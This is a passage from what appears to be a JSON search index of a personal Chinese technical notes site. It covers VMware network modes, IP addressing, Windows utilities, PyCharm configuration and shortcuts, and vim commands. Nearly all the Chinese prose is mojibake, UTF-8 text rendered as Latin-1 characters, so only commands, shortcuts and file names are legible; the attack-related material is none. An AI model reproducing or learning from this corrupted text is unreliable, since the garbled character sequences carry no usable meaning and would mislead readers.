å®‰è£…è™šæ‹Ÿæœºç³»ç»Ÿåä¸éœ€è¦è°ƒæ•´ç½‘ç»œï¼Œç‰©ç†ç½‘ç»œä¸­çš„ \"è·¯ç”±\" æ‰€åŒ…å«çš„DHCPæœåŠ¡å™¨ä¼šè‡ªåŠ¨è¯†åˆ«è¯¥è™šæ‹Ÿæœºå¹¶ä¸ºå…¶åˆ†é…IPåœ°å€ï¼› å¦‚æœæ²¡æœ‰è·¯ç”±ï¼Œå¯ä»¥è‡ªå·±æ‰‹åŠ¨åœ¨ç³»ç»Ÿåˆ†é…ï¼ŒåŸåˆ™æ˜¯å’Œå®¿ä¸»æœºåœ¨åŒä¸€ç½‘æ®µå¹¶æŒ‡å‘ç›¸åŒçš„ç½‘å…³å³å¯é€šä¿¡ã€‚ è™šæ‹Ÿæœºæ”¯æŒ3ç§å¸¸ç”¨ç½‘ç»œæ¨¡å¼ å‚è€ƒ: Vmwareè™šæ‹Ÿæœºä¸‰ç§ç½‘ç»œæ¨¡å¼è¯¦è§£ Bridgeæ¨¡å¼ è™šæ‹Ÿæœºä½œä¸ºç‹¬ç«‹çš„è®¡ç®—ï¼Œå’Œå®¿ä¸»æœºåŒæ ·è¿æ¥åˆ°å¤–éƒ¨ç½‘ç»œã€‚ å¦‚æœå±€åŸŸç½‘ä¸­æ˜¯DHCPï¼Œå°†è™šæ‹Ÿæœºè®¾ç½®ä¸ºé™æ€ipï¼Œå­˜åœ¨ipå†²çªçš„é£é™©ã€‚ æ¡¥æ¥æ¨¡å¼å°±æ˜¯å°†ä¸»æœºç½‘å¡ä¸è™šæ‹Ÿæœºè™šæ‹Ÿçš„ç½‘å¡åˆ©ç”¨è™šæ‹Ÿç½‘æ¡¥è¿›è¡Œé€šä¿¡ã€‚ åœ¨æ¡¥æ¥çš„ä½œç”¨ä¸‹ï¼Œç±»ä¼¼äºæŠŠç‰©ç†ä¸»æœºè™šæ‹Ÿä¸ºä¸€ä¸ªäº¤æ¢æœºï¼Œ æ‰€æœ‰æ¡¥æ¥è®¾ç½®çš„è™šæ‹Ÿæœºè¿æ¥åˆ°è¿™ä¸ªäº¤æ¢æœºçš„ä¸€ä¸ªæ¥å£ä¸Šï¼Œ ç‰©ç†ä¸»æœºä¹ŸåŒæ ·æ’åœ¨è¿™ä¸ªäº¤æ¢æœºå½“ä¸­ï¼Œæ‰€ä»¥æ‰€æœ‰æ¡¥æ¥ä¸‹çš„ç½‘å¡ä¸ç½‘å¡éƒ½æ˜¯äº¤æ¢æ¨¡å¼çš„ï¼Œ ç›¸äº’å¯ä»¥è®¿é—®è€Œä¸å¹²æ‰°ã€‚ åœ¨æ¡¥æ¥æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºipåœ°å€éœ€è¦ä¸ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¦‚æœéœ€è¦è”ç½‘ï¼Œåˆ™ç½‘å…³ä¸DNSéœ€è¦ä¸ä¸»æœºç½‘å¡ä¸€è‡´ã€‚ NATæ¨¡å¼ è™šæ‹Ÿæœºå¯ä»¥è®¿é—®å®¿ä¸»æœºå’Œç½‘ç»œï¼Œå®¿ä¸»æœºä¸èƒ½è®¿é—®è™šæ‹Ÿæœºã€‚ å¦‚æœä½ çš„ç½‘ç»œipèµ„æºç´§ç¼ºï¼Œä½†æ˜¯ä½ åˆå¸Œæœ›ä½ çš„è™šæ‹Ÿæœºèƒ½å¤Ÿè”ç½‘ï¼Œ è¿™æ—¶å€™NATæ¨¡å¼æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚NATæ¨¡å¼å€ŸåŠ©è™šæ‹ŸNATè®¾å¤‡å’Œè™šæ‹ŸDHCPæœåŠ¡å™¨ï¼Œä½¿å¾—è™šæ‹Ÿæœºå¯ä»¥è”ç½‘ã€‚ åœ¨NATæ¨¡å¼ä¸­ï¼Œä¸»æœºç½‘å¡ç›´æ¥ä¸è™šæ‹ŸNATè®¾å¤‡ç›¸è¿ï¼Œ ç„¶åè™šæ‹ŸNATè®¾å¤‡ä¸è™šæ‹ŸDHCPæœåŠ¡å™¨ä¸€èµ·è¿æ¥åœ¨è™šæ‹Ÿäº¤æ¢æœºVMnet8ä¸Šï¼Œ è¿™æ ·å°±å®ç°äº†è™šæ‹Ÿæœºè”ç½‘ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼šè§‰å¾—å¾ˆå¥‡æ€ªï¼Œ ä¸ºä»€ä¹ˆéœ€è¦è™šæ‹Ÿç½‘å¡VMware Network Adapter VMnet8å‘¢ï¼Ÿ åŸæ¥æˆ‘ä»¬çš„VMware Network Adapter VMnet8è™šæ‹Ÿç½‘å¡ä¸»è¦æ˜¯ä¸ºäº†å®ç°ä¸»æœºä¸è™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ã€‚ Host-Onlyæ¨¡å¼ è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºå¯ä»¥äº’ç›¸è®¿é—®ï¼Œä½†æ˜¯è™šæ‹Ÿæœºä¸èƒ½è®¿é—®ç½‘ç»œã€‚ Host-Onlyæ¨¡å¼å…¶å®å°±æ˜¯NATæ¨¡å¼å»é™¤äº†è™šæ‹ŸNATè®¾å¤‡ï¼Œ ç„¶åä½¿ç”¨VMware Network Adapter VMnet1è™šæ‹Ÿç½‘å¡è¿æ¥VMnet1è™šæ‹Ÿäº¤æ¢æœºæ¥ä¸è™šæ‹Ÿæœºé€šä¿¡çš„ï¼Œ Host-Onlyæ¨¡å¼å°†è™šæ‹Ÿæœºä¸å¤–ç½‘éš”å¼€ï¼Œä½¿å¾—è™šæ‹Ÿæœºæˆä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿï¼Œåªä¸ä¸»æœºç›¸äº’é€šè®¯ã€‚ é—®é¢˜æ€»ç»“ NATæ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºæ— æ³•pingé€šç‰©ç†æœº è™šæ‹ŸæœºA1ã€A2æ˜¯ä¸»æœºAä¸­çš„è™šæ‹Ÿæœºï¼Œè™šæ‹ŸæœºB1æ˜¯ä¸»æœºBä¸­çš„è™šæ‹Ÿæœºã€‚ å…¶ä¸­çš„\"NATè·¯ç”±å™¨\"æ˜¯åªå¯ç”¨äº†NATåŠŸèƒ½çš„è·¯ç”±å™¨ï¼Œ ç”¨æ¥æŠŠVMnet8äº¤æ¢æœºä¸Šè¿æ¥çš„è®¡ç®—æœºé€šè¿‡NATåŠŸèƒ½è¿æ¥åˆ°VMnet0è™šæ‹Ÿäº¤æ¢æœºã€‚ A1ã€A2ã€B1è®¾ç½®ä¸ºNATæ–¹å¼ï¼Œæ­¤æ—¶A1ã€A2å¯ä»¥å•å‘è®¿é—®ä¸»æœºBã€Cï¼Œè€ŒBã€Cä¸èƒ½è®¿é—®A1ã€A2ï¼› B1å¯ä»¥å•å‘è®¿é—®ä¸»æœºAã€Cï¼Œè€ŒAã€Cä¸èƒ½è®¿é—®B1ï¼› A1ã€A2ä¸Aï¼ŒB1ä¸Bå¯ä»¥äº’è®¿ã€‚ Linux ä¸‹VMWareè™šæ‹Ÿæœºä¸‹çš„å‡ ç§ç½‘ç»œè¿æ¥æ–¹å¼ä»¥åŠå’Œwindowsä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“ å…¶ä»– è®¾ç½®IPåœ°å€çš„æ—¶å€™ ä»¥ä¸‹ä¸èƒ½ä½¿ç”¨: 192.168.191.0 ä»£è¡¨ç½‘ç»œå· 192.168.191.255 ä»£è¡¨å¹¿æ’­åœ°å€ 192.168.191.2 ä»£è¡¨ç½‘å…³ 192.168.191.1 è¿™ä¸ªè¢«ä¸»æœºç”¨äº† (windowsä¸»æœº) æ‰€ä»¥èƒ½ç”¨çš„IPåœ°å€å°±åªæœ‰3~254äº†ã€‚","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html"},{"title":"WINå®ç”¨å·¥å…·","text":"procexp (Process Explorer) è¿›ç¨‹èµ„æºç®¡ç†å™¨, æ¯”è‡ªå¸¦ä»»åŠ¡ç®¡ç†å™¨æ›´ä¸“ä¸š, å¯æ›¿æ¢; å¯æ˜¾ç¤ºæœ‰å…³æ‰“å¼€æˆ–åŠ è½½äº†å“ªäº›å¥æŸ„å’Œ DLL è¿›ç¨‹çš„ä¿¡æ¯ã€‚ ä¸‹è½½åœ°å€: learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html"},{"title":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","text":"Wmvareä¸‰ç§ç½‘ç»œæ¨¡å¼ ideaå¿«æ·é”® pycharm vim vscode ä½¿ç”¨sambaå®ç°win10æ˜ å°„ç£ç›˜é©±åŠ¨è®¿é—®linux ç»ˆç«¯å·¥å…· android_studio æ–‡ä»¶æ ¼å¼-toml Chrome Clash WINå®ç”¨å·¥å…· VMware Workstation StarWindConverter macä¸‹chromeå¿«æ·é”® macçš„åŒ…ç®¡ç†å™¨brew macä¸‹åº”ç”¨è¿è¡Œç®¡ç†","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-index.html"},{"title":"é…ç½®pytestç¯å¢ƒ","text":"æœ‰æ—¶å€™ç‚¹æµ‹è¯•å·¦è¾¹çš„ä¸‰è§’å½¢, å‘ç°ä½¿ç”¨çš„æ˜¯unittest, äºæ˜¯å°±æ‰¾äº†ä¸€ä¸‹pytestç›¸å…³çš„é…ç½®. å‰æè¯´æ˜, å®‰è£…pyteståŠç›¸åº”pytestæ’ä»¶, å¿…é¡»å®‰è£…çš„åŒ…: pip install pytest pytest-runner pytest.ini è¿™ä¸‰ä¸ªåŒ…è²Œä¼¼ç›´æ¥åŠ *å°±è¡Œ: pip install pytest* ç„¶åçœ‹å…·ä½“çš„æµ‹è¯•ç”¨ä¾‹ä½¿ç”¨äº†å“ªäº›æ’ä»¶, ç„¶åå»è‡ªå·±è£…. æ¯”å¦‚å®šä¹‰äº†asyncå¼‚æ­¥æµ‹è¯•å‡½æ•°, éœ€è¦ä½¿ç”¨asyncioæ ‡è®°: @pytest.mark.asyncio è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°ç›¸åº”çš„æ’ä»¶: pip install pytest-asyncio åœ¨Pycharmé…ç½®é»˜è®¤æµ‹è¯•æ‰§è¡Œç¨‹åº é»˜è®¤æ˜¯è‡ªåŠ¨è¯†åˆ«, å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æŸ¥çœ‹/ä¿®æ”¹: è®¾ç½® =ã€‹ å·¥å…· =ã€‹ Python ç»§æ‰¿å·¥å…· =ã€‹ æµ‹è¯• é»˜è®¤æµ‹è¯•è¿è¡Œç¨‹åº","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html"},{"title":"å…¨å±€æŸ¥æ‰¾å¿«æ·é”®å¤±æ•ˆ","text":"ä¸»è¦æ˜¯Windowsä¸‹é¢, ä½¿ç”¨ Ctrl+Shift+F æ— æ³•æ‰“å¼€æœç´¢çª—å£. å¤šåŠæ˜¯è¾“å…¥æ³•æˆ–è€…å…¶ä»–ä»€ä¹ˆå ç”¨äº†æ­¤å¿«æ·é”®, å¯ä»¥é¼ æ ‡æ”¾åˆ°è¾“å…¥æ³•ç„¶åå³é”®æ‰“å¼€è®¾ç½®. Win10ç³»ç»Ÿè¾“å…¥æ³•å¯èƒ½æ˜¯ç®€ç¹åˆ‡æ¢å ç”¨ æœç‹—è¾“å…¥æ³•ä¹Ÿæ˜¯","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html"},{"title":"Pycharmä¹¦ç­¾ä½¿ç”¨","text":"å¿«æ·é”®-Windows F11 : å…‰æ ‡æ‰€æœ‰ä½ç½®æ·»åŠ ä¹¦ç­¾ Ctrl + å•å‡» : åœ¨å·¦ä¾§è¡Œå·æ—ä½¿ç”¨, æ·»åŠ ä¹¦ç­¾ Shift + F1 : æŸ¥çœ‹æ‰€æœ‰ä¹¦ç­¾ æ³¨è§£ æ·»åŠ ä¹¦ç­¾å, è¿˜å¯è®¾ç½®ç¼–å·, å¦‚å½“å‰ä½ç½®è®¾ç½® 1 , å³å¯ Ctrl + 1 , å¿«æ·è·³è½¬. å¿«æ·é”®-Mac å¾…è¡¥å……","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html"},{"title":"Pycharm","text":"Pycharmä¹¦ç­¾ä½¿ç”¨ pycharmæ·»åŠ ç‰ˆæƒæ–‡ä»¶ pycharmè®¾ç½®åŒæ­¥é—®é¢˜ é…ç½®pytestç¯å¢ƒ å¿«æ·é”® å…¨å±€æŸ¥æ‰¾å¿«æ·é”®å¤±æ•ˆé—®é¢˜","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-index.html"},{"title":"Pycharmæ·»åŠ ç‰ˆæƒæ–‡ä»¶","text":"è®¾ç½®æ¦‚è§ˆ File > Settings > Editor > Copyright > Copyright Profiles ç„¶åæ·»åŠ ç‰ˆæƒæ–‡ä»¶, éšä¾¿è‡ªå·±å‘½åå°±è¡Œ ç‰ˆæƒé…ç½®æ–‡ä»¶ æ–°å»ºå¥½ååœ¨ç‰ˆæƒæè®¾ç½®å¥½ç”Ÿæ•ˆèŒƒå›´å³å¯ è®¾ç½®ç”Ÿæ•ˆèŒƒå›´ æœ€ååº”ç”¨, macä¸‹æ–°å»ºå¥½æ–‡ä»¶å command + n ç›´æ¥æ·»åŠ ç‰ˆæƒå³å¯ æ³¨è§£ windows è²Œä¼¼æ˜¯ alt + insert , ç„¶åé€‰æ‹©copyright ä¸€äº›ç›¸å…³é…ç½®å˜é‡ Pycharmé…ç½®æ–‡ä»¶å¯ç”¨å˜é‡ Name Type Comment $today DateInfo å½“å‰æ—¥æœŸæ—¶é—´å¯¹è±¡ $file.fileName String å½“å‰æ–‡ä»¶çš„åç§° $file.pathName String å½“å‰æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ $file.className String å½“å‰æ–‡ä»¶çš„ç±»å $file.qualifiedClassName String å½“å‰æ–‡ä»¶çš„æƒé™å®šå $file.lastModified DateInfo ä¸Šä¸€æ¬¡ä¿®æ”¹çš„æ—¥æœŸæ—¶é—´å¯¹è±¡ $project.name String å½“å‰é¡¹ç›®å $module.name String å½“å‰ Module å $username String å½“å‰ç”¨æˆ·åï¼ˆç³»ç»Ÿç”¨æˆ·åï¼‰ å…¶ä¸­, DateInfo å¯¹è±¡æœ‰å¦‚ä¸‹å±æ€§å’Œæ–¹æ³•ï¼š DateInfo å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³• Name Type Comment year int å½“å‰å¹´ä»½ month int å½“å‰æœˆä»½ day int å½“å‰æ—¥æœŸï¼ˆ1-31ï¼‰ hour int å½“å‰å°æ—¶ï¼ˆ0-11ï¼‰ hour24 int å½“å‰å°æ—¶ï¼ˆ0-23ï¼‰ minute int å½“å‰åˆ†é’Ÿï¼ˆ0-59ï¼‰ second int å½“å‰ç§’æ•°ï¼ˆ0-59ï¼‰ format(String format) String æ—¶é—´æ—¥æœŸæ ¼å¼åŒ–æ–¹æ³•, å‚è€ƒ:java.text.SimpleDateFormat format æ³¨è§£ Pycharmç½‘ä¸Šå¾ˆå°‘æœ‰è¿™ç§è¯´æ˜, è¿™äº›è¿˜æ˜¯å‚è€ƒçš„ Idea çš„ç›¸å…³è¯´æ˜é…ç½®. è‡ªå®šä¹‰å˜é‡çš„æ–¹å¼ä¹Ÿæ²¡æœ‰æ‰¾åˆ°, åé¢æ‰¾åˆ°äº†å†è¡¥å……. å¦å¤–, ä¹Ÿå¯ä»¥ ç›´æ¥æ·»åŠ æ¨¡æ¿ . è‡ªå·±ä½¿ç”¨çš„é…ç½® coding: utf-8 Copyright (C) 2022-${today.year}, Inc. All Rights Reserved @Time : ${today.format(\"yyyy-MM-dd\")} @Author : yan que @Email : yanquer@qq.com @File : ${file.fileName} @Project : ${project.name} ç›´æ¥æ·»åŠ æ¨¡ç‰ˆçš„æ–¹å¼ ç›´æ¥æ·»åŠ æ¨¡æ¿ å‚è€ƒé…ç½® # coding: utf-8 # # Copyright (C) 2022-${YEAR}, Inc. All Rights Reserved # # @Time : ${DATE} ${TIME} # @Author : yan que # @Email : yanquer@qq.com # @File : ${NAME} # @Project : ${PROJECT_NAME} æ³¨è§£ ä½¿ç”¨æ¨¡ç‰ˆ ä¸ ä½¿ç”¨ç‰ˆæƒé…ç½®æ–‡ä»¶, ä»»é€‰å…¶ä¸€å³å¯, éƒ½ç”¨å¯èƒ½ä¼šç‚¹é—®é¢˜(å†²çªä¼šè‡ªåŠ¨åˆå¹¶)","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html"},{"title":"Pycharm è®¾ç½®åŒæ­¥é—®é¢˜","text":"å‰è¨€ å°†å·¥å…·ç‰ˆæœ¬æ›´æ–°åˆ° PyCharm2022.3 å, åœ¨æ–‡ä»¶æˆ–å³ä¸‹è§’æ‰¾ä¸åˆ°åŒæ­¥è®¾ç½®çš„åœ°æ–¹äº†, ä¸€åº¦ä»¥ä¸ºæ˜¯è¿™ä¸ªåŠŸèƒ½è¢«ç äº†, æœ€ååœ¨è®¾ç½®é‡Œé¢æ‰¾åˆ°äº† è®¾ç½®é‡Œé¢æ–°å¢äº†ä¸€ä¸ª è®¾ç½®åŒæ­¥ é€‰é¡¹, é»˜è®¤ç¦ç”¨, æ‰“å¼€å³å¯.","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html"},{"title":"å¿«æ·é”®","text":"å¿«æ·é”® idea/pycharm command option v newä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™, è‡ªåŠ¨å‘½å, æˆ–è€…å®šä¹‰å˜é‡æ—¶å¿«é€Ÿå‘½å command option <- è¿”å›ä¸Šä¸€ä¸ªä½ç½® command option -> å»ä¸‹ä¸€ä¸ªä½ç½® command shift f å…¨å±€æœç´¢å­—ç¬¦ä¸² command shift r å…¨å±€æ›¿æ¢ command f æ–‡ä»¶å†…æœç´¢å­—ç¬¦ä¸² command r æ–‡ä»¶å†…æ›¿æ¢ shift shift å…¨å±€æœç´¢æ–‡ä»¶å Winä¸‹: ctrl + alt + shift + l : å¿«é€Ÿæ ¼å¼åŒ– å…¶ä»– vscodeå¿«æ·é”®ä½ç½®","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html"},{"title":"vim","text":"vimæœ‰å››ä¸ªæ¨¡å¼ æ­£å¸¸æ¨¡å¼ (Normal-mode) æ’å…¥æ¨¡å¼ (Insert-mode) å‘½ä»¤æ¨¡å¼ (Command-mode) å¯è§†æ¨¡å¼ (Visual-mode) ç®€å•ä½¿ç”¨: vim file #æ‰“å¼€æ–‡ä»¶ file1 file2 #æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶ -O2 file1 file2 #åˆ†å±æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶ã€‚æœ‰å‡ ä¸ªOå‡  -o #å¤§å†™Oè¡¨ç¤ºå·¦å³æ’ç‰ˆï¼Œå°å†™oè¡¨ç¤ºä¸Šä¸‹æ’ç‰ˆ å¸¸ç”¨å¿«æ·é”® å¿«æ·é”®: shift + a (or A) # å¿«é€Ÿç§»åŠ¨åˆ°è¡Œæœ«å°¾, å¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼ dd # åˆ é™¤å½“å‰è¡Œ gg # å…‰æ ‡è·³è½¬åˆ°æ–‡ä»¶é¦–è¡Œ shift + g (or G) # å…‰æ ‡è·³è½¬æ–‡ä»¶æœ€åä¸€è¡Œ _ # å…‰æ ‡ç§»åˆ°å½“å‰è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦ä½ç½® v,V # å¯è§†åŒ–æ¨¡å¼ è¡Œå·+gg # å¿«é€Ÿç§»åŠ¨åˆ°æŒ‡å®šè¡Œå· i # å½“å‰ä½ç½®æ’å…¥ o # å½“å‰è¡Œä¸‹ä¸€è¡Œæ’å…¥ :u # æ’¤é”€ ctrl+r # æ¢å¤æ’¤é”€ æ›´å¤šè¯¦è§:: ç²¾é€š VIM ï¼Œæ­¤æ–‡å°±å¤Ÿäº† ç¼–ç æ ¼å¼ ç¼–ç æ ¼å¼: :set fenc # æŸ¥çœ‹æ–‡æœ¬ç¼–ç  fencæ˜¯fileencodingç¼©å†™ # ä¸ :set fileencoding ä¸€æ · :set fenc='filecode' # è½¬æ¢å½“å‰æ–‡æœ¬çš„ç¼–ç ä¸ºæŒ‡å®šçš„ç¼–ç  :set enc='filecode' # ä»¥æŒ‡å®šçš„ç¼–ç æ˜¾ç¤ºæ–‡æœ¬ï¼Œä½†ä¸ä¿å­˜åˆ°æ–‡ä»¶ä¸­ encodingç¼©å†™ # è¿™é‡Œçš„\"ç¼–ç \"å¸¸è§ä¸ºgbk utf-8 big5 cp936 # fileencoding---fenc # encoding---enc :set invlist æ˜¾ç¤ºæ¢è¡Œç¬¦ç­‰å­—ç¬¦ :set nolist å…³é—­æ¢è¡Œç¬¦ç­‰å­—ç¬¦æ˜¾ç¤º æ¨¡å¼ æ¨¡å¼: :set ff? #æŸ¥çœ‹æ¨¡å¼ç±»å‹ï¼Œä¸€èˆ¬ä¸ºdos,unix :set ff=dos #è®¾ç½®æ¨¡å¼ ä¾‹å¦‚è®¾ç½®unixæ¨¡å¼ :set fileformat=unix #ä¸:set fileformat=dosä¸€ä¸ªæ•ˆæœ ffæ˜¯ç¼©å†™ # fileformat---ff # :%s/&#94;M//gç­‰åŒäº:set ff=unix ç§»åŠ¨ç¼–è¾‘ ç§»åŠ¨ç¼–è¾‘: gg # å…‰æ ‡è·³è½¬åˆ°æ–‡ä»¶é¦–è¡Œ G # å…‰æ ‡è·³è½¬æ–‡ä»¶æœ€åä¸€è¡Œ _ # å…‰æ ‡ç§»åˆ°å½“å‰è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦ä½ç½® A # ç§»åŠ¨åˆ°è¡Œå°¾ v,V # å¯è§†åŒ–æ¨¡å¼ è¡Œå·+gg #å¿«é€Ÿç§»åŠ¨åˆ°æŒ‡å®šè¡Œå· ç²˜è´´ä¸å¤åˆ¶ ç²˜è´´ä¸å¤åˆ¶: y # å¤åˆ¶å½“å‰å…‰æ ‡æ‰€åœ¨å¤„å­—ç¬¦ yy # å¤åˆ¶å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œ p # åœ¨å½“å‰ä½ç½®ç²˜è´´ä¸Šä¸€æ¬¡å¤åˆ¶çš„å†…å®¹ åˆ é™¤ åˆ é™¤: dd #å‘½ä»¤æ¨¡å¼ä¸‹ddåˆ é™¤å½“å‰è¡Œ # åˆ é™¤å¤šè¡Œï¼Œå¦‚åˆ é™¤8-17è¡Œ 8,17d æŸ¥æ‰¾ æ–œæ åè·ŸæŸ¥æ‰¾çš„å­—ç¬¦æŸ¥æ‰¾: :/'what' æ›¿æ¢ æ›¿æ¢: # :{ä½œç”¨èŒƒå›´}s/{ç›®æ ‡}/{æ›¿æ¢}/{æ›¿æ¢æ ‡å¿—} # ä¼šåœ¨å…¨å±€èŒƒå›´(%)æŸ¥æ‰¾fooå¹¶æ›¿æ¢ä¸ºbarï¼Œæ‰€æœ‰å‡ºç°éƒ½ä¼šè¢«æ›¿æ¢ï¼ˆgï¼‰ã€‚ :%s/foo/bar/g sè¡¨ç¤ºå•è¡ŒæŸ¥æ‰¾æ›¿æ¢, %sè¡¨ç¤ºå…¨å±€æŸ¥æ‰¾æ›¿æ¢ å…¶ä»– å…¶ä»–: :w #ä¿å­˜ä¸é€€å‡º :w #æ–°æ–‡ä»¶å æŠŠæ–‡ä»¶å¦å­˜ä¸ºæ–°æ–‡ä»¶ :q #ä¸ä¿å­˜é€€å‡º :wq #ä¿å­˜é€€å‡º :! #å¼ºåˆ¶ :q! #å¼ºåˆ¶ä¸ä¿å­˜é€€å‡ºï¼Œç”¨äºä¿®æ”¹æ–‡ä»¶ä¹‹åï¼Œä¸ä¿å­˜æ•°æ®é€€å‡º :wq! #å¼ºåˆ¶ä¿å­˜é€€å‡ºï¼Œå½“æ–‡ä»¶çš„æ‰€æœ‰è€…æˆ– root ç”¨æˆ·ï¼Œå¯¹æ–‡ä»¶æ²¡æœ‰å†™æƒé™çš„æ—¶å€™ï¼Œå¼ºåˆ¶å†™å…¥æ•°æ®ä½¿ç”¨ :ls #æŸ¥çœ‹å½“å‰ç¼–è¾‘å™¨æ‰€æœ‰æ–‡ä»¶ :bn #åˆ‡æ¢åˆ°ç¬¬nä¸ªæ–‡ä»¶ ä¸»è¦æ˜¯bæ§åˆ¶çš„ åºå·å¯ä»¥å…ˆlsæŸ¥çœ‹ ä¾¿æ·é…ç½® è¯­æ³•é«˜äº®: vim syntax on # è¯­æ³•é«˜äº® filetype indent on # å¼€å¯æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼Œå¹¶ä¸”è½½å…¥ä¸è¯¥ç±»å‹å¯¹åº”çš„ç¼©è¿›è§„åˆ™ set showmode # åº•éƒ¨æ˜¾ç¤ºå½“å‰æ¨¡å¼ï¼Œ å¦‚å‘½ä»¤æ¨¡å¼ã€æ’å…¥æ¨¡å¼ set showcmd # å‘½ä»¤æ¨¡å¼ä¸‹ï¼Œåº•éƒ¨æ˜¾ç¤ºå½“å‰é”®å…¥çš„æŒ‡ä»¤ set mouse=a # æ”¯æŒä½¿ç”¨é¼ æ ‡ set encoding=utf-8 # ä½¿ç”¨ utf-8 ç¼–ç  set t_Co=256 # å¯ç”¨256è‰² ç¼©è¿›: set autoindent # æŒ‰ä¸‹å›è½¦é”®æ—¶ï¼Œä¸‹ä¸€è¡Œç¼©è¿›ä¸ä¸Šä¸€è¡Œä¿æŒä¸€è‡´ set tabstop=2 # æŒ‰ä¸‹tabæ—¶, vimæ˜¾ç¤ºçš„ç©ºæ ¼æ•° set shiftwidth # åœ¨æ–‡æœ¬ä¸ŠæŒ‰ä¸‹>>ï¼ˆå¢åŠ ä¸€çº§ç¼©è¿›ï¼‰ã€<<ï¼ˆå–æ¶ˆä¸€çº§ç¼©è¿›ï¼‰æˆ–è€…==ï¼ˆå–æ¶ˆå…¨éƒ¨ç¼©è¿›ï¼‰æ—¶ï¼Œæ¯ä¸€çº§çš„å­—ç¬¦æ•°ã€‚ set expandtab # ç”±äº Tab é”®åœ¨ä¸åŒçš„ç¼–è¾‘å™¨ç¼©è¿›ä¸ä¸€è‡´ï¼Œè¯¥è®¾ç½®è‡ªåŠ¨å°† Tab è½¬ä¸ºç©ºæ ¼ã€‚ set softtabstop=2 # Tab è½¬ä¸ºå¤šå°‘ä¸ªç©ºæ ¼ å¤–è§‚: set number # set nu ä¹Ÿå¯ï¼Œæ˜¾ç¤ºè¡Œå· set relativenumber # æ˜¾ç¤ºå…‰æ ‡æ‰€åœ¨çš„å½“å‰è¡Œçš„è¡Œå·ï¼Œå…¶ä»–è¡Œéƒ½ä¸ºç›¸å¯¹äºè¯¥è¡Œçš„ç›¸å¯¹è¡Œå·ã€‚ set cursorline # å…‰æ ‡æ‰€åœ¨å½“å‰è¡Œé«˜äº® set textwidth=80 # è®¾ç½®è¡Œå®½ï¼Œå³ä¸€è¡Œæ˜¾ç¤ºå¤šå°‘å­—ç¬¦ set wrap # è‡ªåŠ¨æŠ˜è¡Œï¼Œå³å¤ªé•¿çš„è¡Œåˆ†ä¸ºå‡ è¡Œæ˜¾ç¤º set nowrap # å…³é—­è‡ªåŠ¨æŠ˜è¡Œ set linebreak # åªæœ‰é‡åˆ°æŒ‡å®šçš„ç¬¦å·ï¼ˆæ¯”å¦‚ç©ºæ ¼ã€è¿è¯å·å’Œå…¶ä»–æ 